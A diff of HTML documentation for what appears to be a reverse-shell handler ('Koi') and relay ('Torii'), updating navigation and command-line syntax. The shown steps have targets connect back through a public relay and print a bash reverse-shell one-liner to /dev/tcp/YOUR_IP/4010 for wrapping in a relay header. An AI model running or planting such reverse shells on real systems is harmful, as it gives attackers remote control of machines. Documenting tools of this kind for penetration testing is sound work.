@@ -447,6 +447,34 @@
   
   
     <li class="md-nav__item">
+      <a href="../connect/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Connecting Out
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../upgrading-sessions/" class="md-nav__link">
         
   
@@ -1362,7 +1390,7 @@ With Torii:    port 49410 only
 python3<span class="w"> </span>torii_standalone.py<span class="w"> </span>--listen<span class="w"> </span><span class="m">0</span>.0.0.0:49410<span class="w"> </span>--koi<span class="w"> </span><span class="m">127</span>.0.0.1:4010<span class="w"> </span>--public-host<span class="w"> </span>YOUR_PUBLIC_IP
 
 <span class="c1"># On the same machine, in another terminal (or just koi if you use the default settings)</span>
-koi<span class="w"> </span>--listen<span class="w"> </span><span class="m">127</span>.0.0.1:4010
+koi<span class="w"> </span>--host<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>--port<span class="w"> </span><span class="m">4010</span>
 </code></pre></div>
 <p>That's it. Targets connect to <code>YOUR_PUBLIC_IP:49410</code>, everything routes internally to Koi.</p>
 <hr />
@@ -1379,14 +1407,13 @@ koi<span class="w"> </span>--listen<span class="w"> </span><span class="m">127</
 </code></pre></div>
 <p>Replace <code>YOUR_PUBLIC_IP</code> with the actual IP your targets can reach.</p>
 <h3 id="3-run-koi-on-the-same-machine">3. Run Koi on the same machine</h3>
-<div class="highlight"><pre><span></span><code>koi<span class="w"> </span>--listen<span class="w"> </span><span class="m">127</span>.0.0.1:4010
+<div class="highlight"><pre><span></span><code>koi<span class="w"> </span>--host<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>--port<span class="w"> </span><span class="m">4010</span>
 </code></pre></div>
 <p>It stays on localhost. Torii relays everything from the outside.</p>
 <h3 id="4-create-a-torii-payload-manually">4. Create a Torii payload manually</h3>
 <p>Koi doesn't generate Torii payloads automatically. You create them yourself by prepending the Torii header to a standard reverse shell.</p>
 <p>First, get a regular bash payload from Koi:</p>
-<div class="highlight"><pre><span></span><code>$<span class="w"> </span>koi<span class="w"> </span>payload
-<span class="o">[</span>?<span class="o">]</span><span class="w"> </span>Interface:<span class="w"> </span>eth0
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>koi<span class="w"> </span>--payloads<span class="w"> </span>eth0
 bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/YOUR_IP/4010<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
 </code></pre></div>
 <p>Then wrap it with the Torii header. For a reverse shell on port 4010, the header is <code>0x01 0x0F 0xAA</code>:</p>
